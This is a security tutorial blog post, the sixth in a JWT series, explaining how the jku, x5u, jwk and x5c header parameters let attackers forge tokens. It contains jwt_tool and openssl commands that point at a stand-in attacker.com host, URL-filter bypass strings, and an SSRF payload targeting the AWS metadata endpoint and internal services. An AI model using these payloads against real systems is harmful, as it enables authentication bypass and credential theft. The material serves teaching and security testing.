---
title: "JWT, Part 6: jku/x5u/jwk/x5c - the entire JWT header is an attack surface"
date: 2026-03-20T18:05:00+03:00
number: 6
tags: ["jwt", "security", "web", "auth"]
summary: "The JWT header can contain a URL, and the server will go to that URL to download the key for signature verification. This isn't a bug - it's RFC 7515."
---

**Table of contents:**
- [JWKS: what it is](#jwks-what-it-is)
- [jku spoofing: "download the key from here"](#jku-spoofing-download-the-key-from-here)
- [x5u spoofing: same thing, but with certificates](#x5u-spoofing-same-thing-but-with-certificates)
- [Bypassing URL filters](#bypassing-url-filters)
- [SSRF bonus](#ssrf-bonus)
- [jwk injection: key right in the token (CVE-2018-0114)](#jwk-injection-key-right-in-the-token-cve-2018-0114)
- [x5c injection: self-signed certificate in the token](#x5c-injection-self-signed-certificate-in-the-token)
- [Summary: the entire JWT header is an attack surface](#summary-the-entire-jwt-header-is-an-attack-surface)
- [What's next](#whats-next)

`kid` from the previous article is one header parameter through which you can inject into SQL, the filesystem, and shell. But what's even more interesting? The JWT header can contain a URL, and the server **will go to that URL to download the key** for signature verification. The token essentially tells the server: "here's a link, download the key from there and verify my signature with that key". This isn't a bug - it's RFC 7515.

## JWKS: what it is

Before breaking down the attacks, you need to understand what JWKS is. **JWKS (JSON Web Key Set)** is a JSON file containing an array of the server's public keys. It looks like this:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "key-2024",
      "n": "sXch0p...RSA_modulus...",
      "e": "AQAB",
      "use": "sig"
    }
  ]
}
```

`kty` - key type (RSA, EC, etc.), `kid` - identifier (remember it from the previous article?), `n` and `e` - RSA key parameters, `use: "sig"` - key for signatures. From `n` (modulus) and `e` (exponent) you can assemble the full public key.

Usually JWKS is located at `/.well-known/jwks.json`. During JWT verification, the server goes to this endpoint, finds the key by `kid` from the token header, and verifies the signature. This is standard OAuth 2.0 and OpenID Connect infrastructure.

## jku spoofing: "download the key from here"

The `jku` (JWK Set URL) parameter in the JWT header contains a URL from which the server should download the JWKS with keys. The attack is obvious:

1. Generate our own RSA key pair (private + public)
2. Create a JWKS file with our public key
3. Host it on our server (attacker.com)
4. Set `"jku": "https://attacker.com/jwks.json"` in the JWT header
5. Sign the token with our private key
6. Server goes to attacker.com, downloads our key, verifies the signature - all ok

```bash
# Generate keys
openssl genrsa -out attack.key 2048
openssl rsa -in attack.key -pubout -out attack.pub

# jwt_tool - automatic jku spoofing
python3 jwt_tool.py "$TOKEN" -X s \
  -ju "https://attacker.com/jwks.json"
```

jwt_tool will automatically generate keys, create a JWKS file, sign the token, and prepare everything for exploitation. You just need to host the JWKS on your server.

## x5u spoofing: same thing, but with certificates

`x5u` (X.509 URL) works similarly to `jku`, except instead of JWKS, an X.509 certificate in PEM format is at the URL:

```bash
# Self-signed certificate and key
openssl req -x509 -nodes -days 365 \
  -newkey rsa:2048 \
  -keyout attack.key -out attack.crt \
  -subj "/CN=attacker"
```

Host `attack.crt`, set `"x5u": "https://attacker.com/attack.crt"`, sign with `attack.key`. The server downloads the certificate, extracts the public key from it, verifies the signature.

## Bypassing URL filters

Servers often check URLs from `jku`/`x5u` against a whitelist. "Only download keys from trusted.com". Here's how to bypass this:

**URL confusion.** `https://trusted.com@attacker.com/jwks.json` - `trusted.com` is parsed as the username (the part of the URL before `@`), while the actual host is attacker.com. Some parsers see `trusted.com`, but the HTTP client goes to `attacker.com`.

**Subdomain trick.** `https://trusted.com.attacker.com/jwks.json` - if the filter checks `url.endsWith("trusted.com")`, our domain passes the check.

**Open redirect.** `https://trusted.com/redirect?url=https://attacker.com/jwks.json` - if the trusted domain has an open redirect, the request redirects to us. The filter sees trusted.com, the HTTP client ends up at attacker.com.

**Backslash trick.** `https://trusted.com%5c@attacker.com/jwks.json` - `%5c` is a backslash. Different URL parsers handle it differently. One sees the host as `trusted.com`, another sees `attacker.com`.

**Fragment injection.** `https://attacker.com#trusted.com` - the filter might scan the URL for trusted.com and find it in the fragment. The HTTP client ignores the fragment and goes to attacker.com.

## SSRF bonus

Even if jku/x5u spoofing didn't lead to token forgery (the server does verify the key correctly), the mere fact that the server makes an HTTP request to a URL from the token is SSRF (Server-Side Request Forgery).

```json
{"alg":"RS256", "jku":"http://169.254.169.254/latest/meta-data/"}
```

AWS metadata endpoint. If the server runs in AWS, this request returns credentials, IAM roles, access keys. Other SSRF targets:

- `http://service.namespace.svc.cluster.local/` - Kubernetes internal services
- `http://127.0.0.1:6379/` - Redis
- `http://127.0.0.1:9200/` - Elasticsearch
- `http://127.0.0.1:8500/v1/kv/` - Consul

The server didn't find a valid JWKS? Doesn't matter. It already made the request. SSRF as a bonus to the JWT attack.

## jwk injection: key right in the token (CVE-2018-0114)

The `jwk` parameter in the JWT header can contain a full public key in JWK format. The RFC's idea: if it's inconvenient for the server to fetch the key from a URL, the token can bring the key with it.

CVE-2018-0114 - Cisco node-jose. The library took the public key from the `jwk` header and used it for signature verification. Without checking against a trusted store. Without comparing with known keys. Simply: "Oh, there's a key in the token? Let me verify the signature with this key."

The attack:

1. Generate our own key pair
2. Embed our public key in the JWT header via `jwk`
3. Sign the token with our private key
4. Server extracts our public key from the header, verifies the signature - success

```bash
# jwt_tool does this in one command
python3 jwt_tool.py "$TOKEN" -X i
```

What happens inside:

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<our modulus>",
    "e": "AQAB"
  }
}
```

The token brought its own key for verification. A lock brings its own key and says "check if I fit". Absurd - but that's what the RFC says, and libraries implement it.

CVE-2018-0114 was disclosed in 2018. The same error later surfaced in CVE-2025-24976 (Distribution registry) and CVE-2026-27962 (Authlib). Developers continue to trust keys from the header.

## x5c injection: self-signed certificate in the token

`x5c` contains a chain of X.509 certificates in base64 (**not** base64url - this is an important detail). The first certificate in the array contains the public key for verification.

If the library doesn't verify the chain of trust down to a root CA - we insert a self-signed certificate:

```bash
# Generate a self-signed certificate and key
openssl req -x509 -nodes -newkey rsa:2048 \
  -keyout attack.key -out attack.crt \
  -subj "/CN=attacker" -days 365

# Get base64 (NOT base64url!) of the certificate
CERT_B64=$(openssl x509 -in attack.crt -outform DER | base64 -w0)
```

Insert `"x5c": ["<cert_b64>"]` in the header and sign with `attack.key`. RFC 7515 requires chain validation to a trusted CA. But developers forget, confuse "signature verification" with "certificate validation", or simply don't configure the trusted store.

## Summary: the entire JWT header is an attack surface

Over three articles (5, 6, and this one) we've covered all JWT header parameters:

- **alg** - `none` and algorithm confusion (articles 3-4)
- **kid** - path traversal, SQLi, command injection (article 5)
- **jku/x5u** - key substitution via URL + SSRF (this article)
- **jwk/x5c** - embedding your own key directly in the token (this article)

Every parameter is an attack vector. The JWT header is literally designed for exploitation.

## What's next

So far we've been substituting algorithms and injecting header parameters. In the next article - a completely different approach. What if the secret is simply weak? Hashcat, GPU, 150 million attempts per second. One intercepted token - and you don't need access to the server.
